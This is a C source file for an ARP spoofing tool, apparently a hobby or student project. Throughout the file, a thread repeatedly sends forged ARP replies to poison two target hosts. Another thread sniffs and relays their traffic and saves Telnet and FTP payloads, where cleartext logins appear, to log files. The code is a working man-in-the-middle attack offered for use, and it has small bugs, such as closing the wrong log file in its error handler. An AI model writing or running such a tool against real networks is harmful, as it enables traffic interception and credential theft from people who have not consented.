/*
 *  $Id: libnet.c, v1.0 19/11/2016 12:29:09 quocbao Exp $
 *
 *  libnet.c - main file
 *
 *  Copyright (c) 2016 Quoc-Bao Nguyen <quocbao747@gmail.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

/*
To supress ARP on interface eth0 run the following command as root:
ip link set dev eth0 arp off

To turn it back on again:
ip link set dev eth0 arp on

To clean ARP table
ip -s -s neigh flush all
*/

#pragma pack(1)

#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdarg.h>
#include <stdint.h>
#include <time.h>
#include <getopt.h>
#include <pthread.h>
#include <pcap.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <net/ethernet.h>
#include <linux/if_ether.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "const.h"
#include "structures.h"
#include "convert.h"

//#define DEBUG


int PCAP_LOOP 	= 0;
int CTRL_C		= 0;

struct Network net;
struct LibnetHandler libnet;
struct PcapHandler pcap;

FILE* file_telnet = NULL;
FILE* file_ftp = NULL;

pthread_t ARP_ATTACK;
pthread_t FORWARDER;
pthread_t PRINTING_DOT;

void thread_arpAttack();
void thread_forwarder();

void sendARP(uint32_t target_ip, uint8_t* target_mac_addr, uint32_t source_ip, uint8_t* source_mac_addr);
void processPacket(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char * packet);

void ctrl_c()
{
    printf("Breaking ...\n");
    if (PCAP_LOOP)
		pcap_breakloop(pcap.p);

    CTRL_C = 1;
}

void error(const char *format, ...)
{
    pthread_cancel(PRINTING_DOT);
	pthread_join(PRINTING_DOT, NULL);
    printf("\n");

	va_list arg;

	va_start(arg, format);
	vfprintf(stderr, format, arg);
	va_end(arg);

	if (libnet.link != NULL)
        libnet_destroy(libnet.link);

    if (pcap.p != NULL)
		pcap_close(pcap.p);

	if (file_ftp != NULL)
        fclose(file_ftp);

	if (file_telnet != NULL)
		fclose(file_ftp);

	exit(1);
}


void updateMAC()
{
    printf(".");
    // My infomation
    if (readMyMAC(net.device, net.c.mac.ether_addr_octet, net.c.mac_char) != EXIT_SUCCESS)
        error("Invalid interface %s\n", net.device);
	printf(".");

    if (readMyIP(net.device, &net.c.ip.s_addr, net.c.ip_char) != EXIT_SUCCESS)
        error("Your ip address isn't assigned. You need to connect to a network first !\n");
	printf(".");

    // Read MAC address of target 1
    if (readTargetMAC(net.device, net.c1.ip_char, net.c1.mac.ether_addr_octet, net.c1.mac_char) != EXIT_SUCCESS)
        error("Can't resolve ip address %s into mac address\n", net.c1.ip_char);
	printf(".");

    // Read MAC address of target 2
    if (readTargetMAC(net.device, net.c2.ip_char, net.c2.mac.ether_addr_octet, net.c2.mac_char) != EXIT_SUCCESS)
        error("Can't resolve ip address % into mac address\n", net.c2.ip_char);
	printf(".");

}

// Parse ip address and device name to net
void argumentParser(int argc, char** argv)
{
    if (argc != 7)
		error(USAGE);

    int code = 0;
	char *tmp;
    while ((code = getopt(argc, argv, "a:b:d:")) != -1)
        switch (code)
        {
			case 'a':
				memcpy(net.c1.ip_char, optarg, IP_BIND_ADDRESS_NO_PORT);
				break;
			case 'b':
				memcpy(net.c2.ip_char, optarg, IP_BIND_ADDRESS_NO_PORT);
				break;
			case 'd':
				memcpy(net.device, optarg, BUFFSIZE);
				break;
			case '?':
				error(USAGE);
				break;
			default:
				error(USAGE);
        }

    if (checkDevice(net.device) != EXIT_SUCCESS)
        error("Device %s not found on your system !\n", net.device);

    net.c1.ip.s_addr = libnet_name2addr4(NULL, net.c1.ip_char, LIBNET_DONT_RESOLVE);
    if (net.c1.ip.s_addr == -1)
        error("Invalid IP address: %s\n", net.c1.ip_char);

    net.c2.ip.s_addr = libnet_name2addr4(NULL, net.c2.ip_char, LIBNET_DONT_RESOLVE);
    if (net.c2.ip.s_addr == -1)
        error("Invalid IP address: %s\n", net.c2.ip_char);
};

void thread_forwarder()
{
    printf("Begining Packet forwarder & recorder...\n");
    pcap.p = pcap_open_live(net.device, IP_MAXPACKET, PCAP_PROMISCUOUS_MODE,  PCAP_INTERVAL, pcap.errbuf);
    if (pcap.p == NULL)
        error("Can't open device %s\n", net.device);

    PCAP_LOOP = 1;
    pcap_loop(pcap.p, -1, processPacket, NULL);
}

// inet_ntoa
void processPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	struct Packet p;

    p.ethernet.header = (struct ether_header*)(packet);
    p.ethernet.size = ETH_HEADER_SIZE;
    const uint8_t bcast[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    if (memcmp(bcast, p.ethernet.header->ether_dhost, 6) == 0)
        return;

    uint8_t* dst = NULL;
    if ((memcmp(net.c1.mac.ether_addr_octet, p.ethernet.header->ether_shost, 6) == 0) &&
		(memcmp(net.c.mac.ether_addr_octet, p.ethernet.header->ether_dhost, 6) == 0))
    {
        dst = net.c2.mac.ether_addr_octet;
    }
    else if ((memcmp(net.c2.mac.ether_addr_octet, p.ethernet.header->ether_shost, 6) == 0) &&
             (memcmp(net.c.mac.ether_addr_octet, p.ethernet.header->ether_dhost, 6) == 0))
    {
		dst = net.c1.mac.ether_addr_octet;
    } else return;

	// Correct dst mac address. It is stored in the first 6 byte
	memcpy(p.ethernet.header, dst, 6);

	static int count = 1;
    printf("\nPacket number %d:\n", count++);

    switch (ntohs(p.ethernet.header->ether_type))
    {
		case ETHERTYPE_IP:
			p.ip.header = (struct ip_header*)(packet + p.ethernet.size);
			p.ip.size = (p.ip.header->ip_vhl & 0xf) * 4;   // 1 bit represet for 1 word;

			printf("IPv4 packet\n");
			printf("Header length: %d bytes\n", p.ip.size);
			printf("Protocol: ");
			switch (p.ip.header->ip_p)
			{
				case IPPROTO_ICMP:
					printf("ICMP\n");
					//memset(packet + 14 + size_ip + 2, 0, 2);
					//uint16_t checksum = calcChecksum(packet + 14, size_ip);
					//memcpy(packet + 14 + size_ip + 2, &checksum, 2);
					break;

				case IPPROTO_TCP:
					printf("TCP\n");
					// Telnet: port 23
					// FTP & Telnet here
                    p.tcp.header = (struct tcp_header*)(packet + p.ethernet.size + p.ip.size);
                    p.tcp.size = p.tcp.header->offflag >> 20;

                    printf("TCP port(%d) to (%d)\n", ntohs(p.tcp.header->sport), ntohs(p.tcp.header->dport));
					p.payload.data = (uint8_t*)(packet + p.ethernet.size + p.ip.size + p.tcp.size);
					p.payload.size = ntohs(p.ip.header->ip_len) - (p.ip.size + p.tcp.size);


                    if ((ntohs(p.tcp.header->sport) == PORT_TELNET) || (ntohs(p.tcp.header->dport) == PORT_TELNET))
						fwrite(p.payload.data, 1, p.payload.size, file_telnet);
					else if ((ntohs(p.tcp.header->sport) == PORT_FTP_COMMAND) || (ntohs(p.tcp.header->dport) == PORT_FTP_COMMAND))
						fwrite(p.payload.data, 1, p.payload.size, file_ftp);

					break;

				default:
					printf("Unknown\n");
			}
			printf("\n");
			break;
		case ETHERTYPE_ARP:
			//
			printf("ARP packet\n");
			break;
		default:
			//
			printf("Unknown packet\n\n");
			break;
    }

	// Send packet back to the network
    libnet_write_link(libnet.link, packet, pkthdr->len);
    //pcap_inject(pcap.p, packet, pkthdr->len);
}

void dot()
{
	system("echo -n Reading infomation");
	while (1)
		system("echo -n . >> /dev/stdout && sleep 0.5");
}

int main(int argc, char** argv)
{
    // Initialize signal trap
    signal(SIGINT, ctrl_c);

	if (checkPermission(1))
        return EXIT_FAILURE;

	libnet.link = NULL;
	pcap.p = NULL;

    pthread_create(&PRINTING_DOT, NULL, (void*)&dot, NULL);

    // Update infomation into net
    argumentParser(argc, argv);

	updateMAC();
    pthread_cancel(PRINTING_DOT);
	pthread_join(PRINTING_DOT, NULL);
	printf("\n");

    system("rm telnet.log");
    system("rm ftp.log");
    file_telnet = fopen("telnet.log", "wb");
    file_ftp = fopen("ftp.log", "wb");

    printf("------ Current system infomation ------\n");
    printf("Device: %s\n", net.device);
    printf("Your IP address:  %s\n", net.c.ip_char);
    printf("Your MAC address: %s\n", net.c.mac_char);
    printf("Log file for FTP:    %s\n", LOG_FTP);
    printf("Log file for TELNET: %s\n", LOG_TELNET);
    printf("\n");
    printf("---------- Target infomation ----------\n");
    printf("Target 1:  %s (%s)\n", net.c1.ip_char, net.c1.mac_char);
    printf("Target 2:  %s (%s)\n", net.c2.ip_char, net.c2.mac_char);



    // LIBNET_LINK			Link layer interface. The developer needs to create packets down to the link layer.
    // LIBNET_LINK_ADV   	Link layer interface in advanced mode. This allows the developer additional control over the packet being created.
    // LIBNET_RAW4			Raw sockets interface for IPv4 (normal Internet ip). The developer needs to create packets down to the Internet layer.
    // LIBNET_RAW4_ADV		Raw sockets interface for IPv4 in advanced mode. This allows the developer additional control over the packet being created.
    // LIBNET_RAW6			Raw sockets interface for IPv6 (next-generation ip).
    // LIBNET_RAW6_ADV		Raw sockets interface for IPv6 in advanced mode. This allows the developer additional control over the packet being created.
    libnet.link = libnet_init(LIBNET_LINK, net.device, libnet.errbuf);
    if (libnet.link == NULL)
        error("libnet_init() with LIBNET_LINK failed: %s\n", libnet.errbuf);


	pthread_create(&FORWARDER, NULL, (void*)&thread_forwarder, NULL);
	pthread_create(&ARP_ATTACK, NULL, (void*)&thread_arpAttack, NULL);

	pthread_join(FORWARDER, NULL);
	pthread_cancel(ARP_ATTACK);
	pthread_join(ARP_ATTACK, NULL);


	fclose(file_telnet);
    fclose(file_ftp);
    libnet_destroy(libnet.link);
    pcap_close(pcap.p);

    exit(EXIT_SUCCESS);
}

// This is a thread
void thread_arpAttack()
{
    printf("Begining ARP Spoofing attack...\n");
    while (1)
    {
        sendARP(net.c1.ip.s_addr, net.c1.mac.ether_addr_octet, net.c2.ip.s_addr, net.c.mac.ether_addr_octet);
        sendARP(net.c2.ip.s_addr, net.c2.mac.ether_addr_octet, net.c1.ip.s_addr, net.c.mac.ether_addr_octet);
        sleep(TIMEOUT*3);
    }
}

void sendARP(uint32_t target_ip, uint8_t* target_mac_addr, uint32_t source_ip, uint8_t* source_mac_addr)
{
    libnet_clear_packet(libnet.link);

    // Building ARP header
    // I am ... at ...
    if (libnet_autobuild_arp(ARPOP_REPLY, source_mac_addr, (uint8_t*)(&source_ip), target_mac_addr, (uint8_t*)(&target_ip), libnet.link) == -1)
        error("Error building ARP header: %s\n", libnet_geterror(libnet.link));

    // Building Ethernet header
    if (libnet_build_ethernet(target_mac_addr, source_mac_addr, ETHERTYPE_ARP, NULL, 0, libnet.link, 0) == -1)
        error("Error building Ethernet header: %s\n", libnet_geterror(libnet.link));

    // Writing packet
    uint32_t byte_written = libnet_write(libnet.link);
    if (byte_written != -1)
    {
#ifdef DEBUG
        printf("%ld\tARP packet sent ! %d bytes written\n", clock(), byte_written);
#endif
    } else error("Error writing ARP packet: %s\n", libnet_geterror(libnet.link));

    libnet_clear_packet(libnet.link);
}
